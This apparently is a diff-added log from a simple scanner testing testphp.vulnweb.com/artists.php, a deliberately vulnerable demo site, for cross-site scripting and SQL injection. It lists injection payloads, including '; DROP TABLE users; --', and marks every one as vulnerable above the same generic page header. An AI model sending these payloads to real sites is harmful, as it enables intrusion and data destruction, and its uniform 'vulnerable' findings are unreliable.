+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:37.168305] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:37.905315] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:38.602841] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:39.427283] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:40.243136] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:40.861431] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:41.475938] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:42.081849] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:42.711059] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:43.519400] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: " OR ""="
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:44.231670] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:44.954081] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:47.645820] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:48.347464] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '><script>alert('xss')</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:49.072285] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <img src=x onerror=alert('xss')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:52.029936] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:52.656694] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:54.499489] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:58.694179] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '; DROP TABLE users; --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:56:59.405980] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:57:00.125440] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1/*
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:14.776789] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:15.475054] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '><script>alert('xss')</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:16.363268] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <img src=x onerror=alert('xss')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:17.002599] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:17.688290] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:18.308082] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:18.957872] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '; DROP TABLE users; --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:19.573393] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:01:20.298022] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1/*
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:13:56.037975] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:13:56.953076] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '><script>alert('xss')</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:13:57.772815] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <img src=x onerror=alert('xss')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:13:58.696533] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:13:59.416611] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:14:00.337742] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:14:01.153273] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '; DROP TABLE users; --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:14:01.852031] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 13:14:02.699473] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1/*
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:42.956839] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:43.616181] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '><script>alert('xss')</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:44.651704] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <img src=x onerror=alert('xss')>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:45.607592] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:47.749106] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:48.831256] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR '1'='1' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:50.164413] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: '; DROP TABLE users; --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:51.554061] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-22 16:38:52.879407] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: ' OR 1=1/*
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
